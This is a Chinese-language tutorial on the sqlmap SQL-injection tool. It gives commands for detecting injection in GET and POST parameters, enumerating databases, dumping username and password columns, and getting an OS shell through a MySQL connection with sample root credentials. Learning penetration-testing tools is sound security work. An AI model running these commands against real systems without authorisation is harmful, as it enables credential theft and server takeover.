### 介绍

开源的自动化工具，主要用于检测和利用SQL注入漏洞。

sqlmap可以自动化地发现网站的SQL注入点，并提取数据库中的数据，如表名，列名，记录等，甚至在某些情况下可以获取系统权限





### 基本功能

- 检测SQL注入漏洞

- 枚举数据库信息（数据库名，表名，列名，数据）

- 执行系统命令（在特定条件下）





### 基本用法



#### 测试GET参数中是否存在sql注入

```
sqlmap -u <url>?id=1 --batch 
```

-u指定目标url

id为参数，1为值

--batch表示批量模式，启用这个选项后，sqlmap会在运行过程中自动选择默认选项，而不会停下来等待用户输入确认。




#### 测试POST参数是否存在sql注入

```
sqlmap -u <url> --data "id=1" --batch 
```

--data 指定post参数



#### 枚举数据库

```
sqlmap -u <url> --data "id=1" --dbs --batch 
```

--dbs 列出所有数据库名





#### 指定数据库名枚举表（testdb）

```
sqlmap.py -u <url>?id=1 -D testdb --tables
```

-D 指定数据库名

--tables 列出表名





#### 提取字段名（testdb数据库下的users表）

```
sqlmap -u <url>?id=1 -D testdb -T users --columns
```

-T 指定表名
--columns 列出字段名





#### 提取（testdb数据库下的users表中的username和password的数据）

```
 sqlmap -u <url>?id=1 -D testdb -T users -C "username,password" --dump
```

-C 指定列名
--dump 导出数据



#### 读取文件检测

将抓包内容保存到文件，利用sqlmap读取文件内容自动检测

```
sqlmap -l 1.txt --batch
```

![image-20250309162507850](./assets/image-20250309162507850.png)



(可以在要检测的注入点加 * 号)





#### getshell

```
sqlmap -d "mysql://root:123456@172.16.15.111:3306/mysql" --os-shell
```

![image-20250603124738024](./assets/image-20250603124738024.png)